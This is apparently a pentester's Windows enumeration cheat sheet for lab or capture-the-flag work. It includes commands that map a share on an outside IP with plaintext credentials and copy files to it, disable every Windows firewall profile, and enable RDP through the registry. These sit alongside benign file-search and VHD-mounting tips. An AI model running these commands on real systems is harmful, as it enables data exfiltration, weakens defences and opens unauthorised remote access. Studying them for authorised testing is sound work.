# Windows Enumeration Tips
 
 ## Searching files with dir
 ```
 [@swisskyrepo] https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
 
 dir /S /B filename*.txt
 ```

 ## Map Drive from CLI
 ```
 net use f: \\10.10.14.49\files /user:ph0enix password123
 net use M: \\ip-address\share /Persistent:Yes
 ```

 ## Copy File to Mapped Drive
 ```
 cp <filename> f:\ 
 (or location)
 ```

 ## Enable/Disable Windows Firewall CLI
 ```
 NetSh Advfirewall set allprofiles state on
 netsh advfirewall set allprofiles state off
 ```

 ## Enable RDP (Terminal Services)
 ```
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 ```

 ## Mount a VHD Drive
 - ```--add`` is the name of the file
 ```
 mkdir /mnt/vhd
 sudo guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro -v /mnt/vhd
 ```